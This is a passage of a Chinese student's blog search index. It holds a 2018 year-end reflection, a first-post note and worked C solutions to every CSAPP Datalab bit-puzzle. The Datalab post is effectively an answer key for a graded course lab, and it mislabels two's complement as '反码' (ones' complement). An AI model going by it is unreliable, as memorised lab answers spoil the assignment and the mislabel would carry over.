恩，看到成绩出来的那一刻，就像高考完铃声响起的刹那，脑子是空白的，不知该说些什么。然后就是不敢相信自己–我拿到了自己几乎未曾想过的分数，甚至都不敢去再看它一眼。还有印象，那个中午我啥也没吃，就躺在床上发呆，想想自己今后的路该怎么走。是要复读吗？不，绝对不行，我没有勇气去再面对一次高三。就这样吧，差一点就差一点吧，毕竟考试总有人会考得不好的，为什么不能偏偏是我呢？基本上，其实经过了一两天的缓和，也就没有再去想那么多了。尽管现在再次提起还是有些难过的，但也没办法吧。 后面到八月初，就又是一段算是十分快乐的时光了。加入了本地的一个补习社，和几个小伙伴们一起，备课，讲课，每天基本上都是在这样的重复中度过。最多的时候一天能有8节课，常常不得已要利用睡觉的时间来备课。那段时间觉得很累，但是却很舒坦。这里放一张照片纪念一下。 Before enter University 在忙完了辅导社之后，接下来的时间基本上都是在做一些提前的学习了。毕竟想要在大学考得好，还是需要提前下一番功夫，起码在这一点，要比别人赢在起跑线上，真的不愿意再一次输了。也就是在那段时间，认识了吴晓杰师兄和陈钊燚师兄，也是在他们的帮助下，对大学有了一点了解，也算是更加了解了一下自己究竟想要一些什么。然后就是在不断的学习了。 很奇怪，也许是高考考得不好，也许是因为一些其他什么事情，自从那段时间以来，心里最大的目标就只剩学习（其实还有看番hhh）了。可能是心里那一股不服输的劲吧，以及对自己越来越高的要求，总是不断地告诉自己，必须比别人多付出更多的时间，一定要学得更多，更好。也是从那段时间开始，基本上就已经不再碰任何游戏了，社团也不想参加，变成了一个真真正正的“宅”了。也许这确实有些不好吧。 Enter UniqueStudio 经过了开学以来的努力学习，以及一点运气，最后终于挺过了数轮面试，进入到了联创团队（uniquestudio）当中。还是很高兴能成为团队的一员的，至少说明了，自己的努力真的还是有回报的。然后再接下来，到年底的时间里面，基本上大部分的课余时间都留给了团队了。平均每周四五十小时以上的学习时间，一周又一周地过去。 刚开始进来的那段时间，也许是最艰难的。很多东西都完全不会，android studio的各种配置什么的问题可以卡好几天。在第一个任务的时候，还啥都不会，所有东西都是边学边做，一个小功能要重复改来改去弄好多遍，往往弄很多遍之后还是不太好，弄到自己也是很烦躁。所以第一个任务做得很差。到了第二个任务的时候，慢慢地开始注意了一些设计模式方面的问题，不会太盲目地想往哪里加功能就往哪里加，不过也是由于经验太少，反复踩了很多坑。好在最后终于算是基本完成了要求了，尽管花的时间比预计的要多一些。基本上对很多东西的了解又加深了一些。 再后面已经接近年末了，第二期任务做完一段时间过后，搭建了自己的第一个博客，也就是这里。也开始尝试这把自己的一些想法记录下来吧。然后也下决心开始看CSAPP这一本书了。说实话，这本书确实很多东西讲得很好（尽管我现在看的还很少），基本上能把我想要知道的东西都讲了，不过语言还是令人很难受的一个坎，毕竟从初中开始英语就不怎么样。好在还有翻译这种神奇的东西，基本上靠半蒙半查加上一点直觉，慢慢地让自己能够静下心来看这本书了，也算是自己的一个进步了吧。 然后就基本上到了年末了，也就是前几天了。慢慢开始减少了一些花在这方面的时间了，稍微把时间分配给了一下课内的一些知识，毕竟说到底，到现在我都没办法确定自己究竟想要读研究生还是直接出来工作，毕竟大一上学期还是不要太早下论断的好吧。还是得看一下这学期末的成绩吧，如果能够考得比较好，将来有希望能保研去清北复交或者浙大中科大之类的，那还是有可能争取一下的。这个寒假应该就需要结合自己的成绩想清楚了吧。 expection 其实感觉这东西很说不准。毕竟现在真的还没办法未来要做什么。但近期的一些flag还是可以立一下的。尽量在寒假把CSAPP多看一点吧，最好能看完70%以上吧，以及最好多做几个实验，也算是巩固一下自己看书学到的一些知识。然后下学期开始后尽量快点把这本书看完，接着花几个星期的时间把开发艺术探索，源码设计模式等补了，有时间的话看一下争取在大一下学期结束之前把计网和现代操作系统看了吧。基本上大一能把这几本书看完就已经很不错了。 然后如果将来要走偏图形这一块的话，那可能需要稍微为这方面做一点准备了。以及线代一定要学好。如果将来选择争取保研的话，那可能要找一些数学方面的更深入的书籍学习一下，物理可能也需要花一些时间。毕竟理工科无论如何这两个科目一定不能差吧。 然后如果将来选择放弃保研，毕业后就直接出来工作的话，那可能会在大一的暑假看一下linux内核的一些东西或者是Android底层的源码，起码要比现在再深入一些吧。 Summary 最后还是再罗嗦一下吧。总的来说，2018年对我自己来说确实可以称得上是转折性的一年。这一年里发生了太多值得我去回忆的事情。我也很庆幸，自己能够变成现在这个样子，尽管它未必很好。很开心，现在身边能有很多优秀的同学值得我去学习，未来的路子还长，还需要一步一个脚印继续慢慢往前走去。 结尾还是要放点啥，就留下我特别喜欢的一段话吧： 人の人生は、自分の墓へ走る汽车に乗っているようだ。途中は沢山駅があるけど、ずっと最後まで侧にいってくれる人はいない。だから、いってくれた人が降りる前に、いくらさびしくても、感谢の気持ちでさよならと言おう。]]></content>
      <categories>
        <category>summary</category>
      </categories>
      <tags>
        <tag>summary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[csapp-Datalab]]></title>
    <url>%2F2018%2F12%2F25%2Fcsapp-Datalab%2F</url>
    <content type="text"><![CDATA[序 这是csapp系列的第一篇文章。本文主要讲一下关于 datalab [Updated 11/2/18] 的解决方法以及简单的思路。如果有哪里写的不清楚或者有问题，欢迎联系我修改(右下角小图标点开即可对话)。 注：其中某些题目应该有更优的解法。以下仅供参考 bitXor题意：用 ~ 和 &amp; 运算符实现 Xor 运算符思路：我们知道Xor运算符是对每一个位，相同的话返回0，不同的话返回1。题目中仅有 &amp; 是双目运算符，那么我们可以采用 &amp; 运算符获得均为1的位，再取反，同理，用 &amp; 和 ~ 获得均为 0 的位，再取反，最后两者再进行 &amp; ，即可得到答案。解：123int bitXor(int x, int y) &#123; return ~(x&amp;y)&amp;~(~x&amp;~y);&#125; tmin题意：让你输出反码下的最小值思路：水题。。直接由定义得。解：123int tmin(void) &#123; return 1&lt;&lt;31;&#125; isTmax题意：判断一个数是否为反码下的最大值思路：若x为Tmax，x+1取反之后应该等于x。故可以采用取反与原数Xor的思路。但要注意，0xffffffff也满足该性质，需要排除。解：123int isTmax(int x) &#123; return !(~(x+1)^x)&amp;!(!(~x));&#125; allOddBits题意：判断一个数是否所有的奇数位都为1。(位的序号从0到32)思路：我们知道，若奇数位为均为1，则右移一位后偶数位均为1，两者相与的话为0xffffffff。利用该性质可得到答案。不过要注意，偶数位上的1会影响我们的判断，故需要利用掩码将其过滤。(0xA = 1010)解：1234int allOddBits(int x) &#123; x = x &amp; 0xAAAAAAAA; return !(~(x|(x&gt;&gt;1)));&#125; negate题意：求一个数的相反数。思路：水题，由常用结论我们知道，-x = ~x + 1解：123int negate(int x) &#123; return ~x+1;&#125; isAsciiDight题意：判断一个数字是否在(0x30和0x39)之间思路：这道题我想不出比较好的解法。只能暴力判断。即先看2进制下的前26六位是否有值，然后在看下后6位。x+6仍然小于0x40，则x小于0x3。.再看下剩下六位中前两位是否均为1，是的话x大于0x30。解：12345int isAsciiDigit(int x) &#123; int t = x &amp; 0xFFFFFFC0; x = x &amp; 0x3F; return !t&amp;!((x+6)&amp;0x40)&amp;(x&gt;&gt;4)&amp;(x&gt;&gt;5)&amp;1;&#125; conditional题意：实现三目运算符 ？：思路：先用！判断是否为x是否为真。然后在利用与的性质：一个数和0xffffffff相与结果为其本身，和0相与结果为0。解：1234int conditional(int x, int y, int z) &#123; x = !x; return y&amp;(~(!x)+1) | z&amp;(~x+1);&#125; isLessOrEqual题意：判断x是否小于等于y思路：x&lt;=y 则 y - x &gt;= 0。分别取出x和y的符号，进行判断。若y大于0，x小于0，则显然为真。若y小于0，x大于0，则显然为假。剩下的异号的情况则用y + (-x) 判断即可。解：12345int isLessOrEqual(int x, int y) &#123; int sgnx = (x&gt;&gt;31)&amp;1; int sgny = (y&gt;&gt;31)&amp;1; return !sgny &amp; sgnx | !(sgnx^sgny) &amp; !((y + (~x+1))&amp;(1&lt;&lt;31));&#125; logicalNeg题意：使用其他的逻辑运算符和位运算符实现 ！运算符思路：我们知道，一个数的相反数等于其本身的数只有0(注意：~0x80000000 + 1 = 0x80000000)解：123int logicalNeg(int x) &#123; return ((~x+1 | x)&gt;&gt;31)+1;&#125; howManyBits题意：给一个数字x,求出要表示出x需要的最少的位数。思路：个人觉得，本题难度很大。以下的思路可能并不算很好，不过还是可以通过的。 首先，我们知道，对于一个n位的二进制数，能表示的数字的范围为 -2n ~ 2n - 1。故对于输入的整数x，我们可以先将其变成正数，即下方的_mask。现在就只需考虑正数。题目转化为求最高位的1。但最高位的1不是很好求，我们可以将其转化为求二进制下x含有多少个1。 假设当前最高位的1位于第5位，右移并按位或后，第五位，第四位均为1，再向右移两位并且按位或，第二、三、四、五位均为1，以此类推，我们将最高位的1后的所有位全部变成了1。(假设原数为0x0A0BA973，经过处理之后就会变成0x0FFFFFFF)。 接下来考虑如何求出所有位上1的总数。我们可以考虑使用分段的办法。考虑以下的32位二进制数,我们将其分成四个部分： 00000010 | 00100111 | 11010010 | 00110001接下来我们采用掩码分别将其各个部分的1的总数做一个累加，掩码应为： 00000001 | 00000001 | 00000001 | 00000001即对每一个部分，掩码的值都是1。接下来用&amp;运算符获得最低位的数字，四个部分分别为0,1,0,1. 然后，再将x右移一位，再继续进行&amp;运算，以此类推，最后得到四个部分的值分别为：1,4,4,3。即最后得到的sum为： 00000001 | 00000100 | 00000100 | 00000011最后再利用掩码0xff(11111111)，分别得到各个部分的值，做一个累加，得到答案(别忘记+1)。解：12345678910111213141516171819int howManyBits(int x) &#123; int _mask = (x&amp;(1&lt;&lt;31))&gt;&gt;31; x = x^_mask; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; int sum = 0, mask = 0x1 | 0x100 | 0x10000 | 0x1000000; sum += x &amp; mask; sum += (x&gt;&gt;1) &amp;mask; sum += (x&gt;&gt;2) &amp;mask; sum += (x&gt;&gt;3) &amp;mask; sum += (x&gt;&gt;4) &amp;mask; sum += (x&gt;&gt;5) &amp;mask; sum += (x&gt;&gt;6) &amp;mask; sum += (x&gt;&gt;7) &amp;mask; return (sum&amp;0xff) + ((sum&gt;&gt;8)&amp;0xff) + ((sum&gt;&gt;16)&amp;0xff) + ((sum&gt;&gt;24)&amp;0xff) + 1;&#125; floatScale2题意：本题给一个无符号数，让你把它看成一个浮点数(都是32位)，让你输出x * 2 的值思路：比较简单，按照浮点数1,8,23的分布将符号，指数，尾数分别取出，并分类讨论即可。解：123456789101112131415unsigned floatScale2(unsigned uf) &#123; unsigned frac = uf&amp;0x007fffff; uf&gt;&gt;=23; unsigned exp = uf&amp;0xff; uf&gt;&gt;=8; if (!exp) &#123; frac &lt;&lt;= 1; int t = frac&gt;&gt;23; if (t) &#123; frac = frac &amp; 0x007fffff; exp++; &#125; &#125; else if (exp != 0xff) exp++; return (uf&lt;&lt;31) + (exp&lt;&lt;23) + frac;&#125; floatFloat2Int题意：给你一个无符号数，并将其看成浮点数(32位)，要求输出(int)x的值思路：本题依然在考察对浮点数的基本理解。解决的思路同上题类似，不再赘述。另外提醒一下，本题有个坑，求得到的bias直接拿来进行右移运算或左移运算会存在问题：&gt;&gt; 和 &lt;&lt; 运算符当偏移量超过32时，会自动进行取模运算，故有可能使得结果出现错误。左移的话有可能还会导致答案溢出。记得分类讨论。解：1234567891011121314151617181920212223242526int floatFloat2Int(unsigned uf) &#123; int frac = uf &amp; 0x007fffff; uf &gt;&gt;= 23; int exp = uf &amp; 0xff; uf &gt;&gt;= 8; int sgn = uf; if (exp == 0xff) return 0x80000000u; else if (!exp) return 0; else &#123; frac |= 0x800000; int bias = exp - 0x7f - 23; if (bias &lt; 0) &#123; bias = -bias; if (bias &gt;= 32) bias = 31; frac &gt;&gt;= bias; &#125; else if (bias &gt; 0) &#123; while(bias) &#123; frac&lt;&lt;=1; bias--; if (frac &lt; 0) return 0x80000000u; &#125; &#125; if (sgn) return -frac; else return frac; &#125;&#125; floatPower2题意：给一个整数x，要求输出2.0x的值。思路：同样，本题依然在考察对浮点数存储的基本理解。要注意的是，+INF的是指exp为0xff，frac为0的值。NaN指的是exp为0xff，frac不为0的值。0的浮点数表示依然为0。解：12345678910unsigned floatPower2(int x) &#123; int sgn = 0, exp = 0, frac = 0; if (x &lt; -126 - 23) return 0; else if (x &lt; -126) frac = 1 &lt;&lt; (149+x); else &#123; exp = x + 127; if (exp &gt; 0xff) return 0x7f800000; &#125; return (exp&lt;&lt;23) + frac;&#125; 结尾 倘若一切顺利，你最终将得到类似这样的一张图片： 那么恭喜你，你的第一个实验————Datalab通关啦！]]></content>
      <categories>
        <category>csapp</category>
      </categories>
      <tags>
        <tag>csapp</tag>
        <tag>binary</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[First article]]></title>
    <url>%2F2018%2F12%2F14%2FFirst-article%2F</url>
    <content type="text"><![CDATA[First article 终于基本把博客弄完了 感觉现在充满了成就感O(∩_∩)O。从这星期一开始就想弄了，但是却一直拖着。前两天在学HTML的一些语法，觉得语法真的好多啊，而且有点复杂。然后周三周四就基本都是在看搭博客的一些相关的东西，花了好长时间，一直在踩坑（可能是我比较菜）。买域名，弄github pages什么的。一开始用jekyll的框架来搭建，遇到了无数的问题，最后好在基本解决了，但是又发现踏入了一个新的大坑：找不到好用的模板。然后最后看到了hexo，果断先找模板。在看到了nexT这个主题之后，果断选择入坑。 可能是由于之前jekyll踩的坑有点多，也有可能是hexo比较适合小白。。基本上这个搭建过程中没有出现什么比较大的问题，然后弄完就是各种优化什么的，也算比较顺利吧，到今天早上就基本算是结束了。整体上还是过得去的。（不过貌似手机版看起来的效果比较差？？） 然后在这里就还是来立一个flag吧。以后（至少应该是大学期间吧）这个博客应该是会一直做下去的，尽量每个月至少发一篇博客吧，不过比较忙的时候的话可能没什么办法。基本上大部分博客的内容应该是以硬核为主，不过目前水平不够，也没办法写出比较高质量的东西。内容上可能主要是当前阶段在学习的一些东西，算法，数据结构，或者是自己做的一些小项目，课设什么的也有可能会放进来。目的还是分享吧，如果有什么地方写的不太好，欢迎直接私戳（网页版的话右下角应该是有一个对话框的）。 好吧，憋不出来了。。就这样吧 哦对了，最后放上一张有爱的图片镇楼（p站上找的）。]]></content>
      <categories>
        <category>others</category>
      </categories>
      <tags>
        <tag>others</tag>
      </tags>
  </entry>
</search>
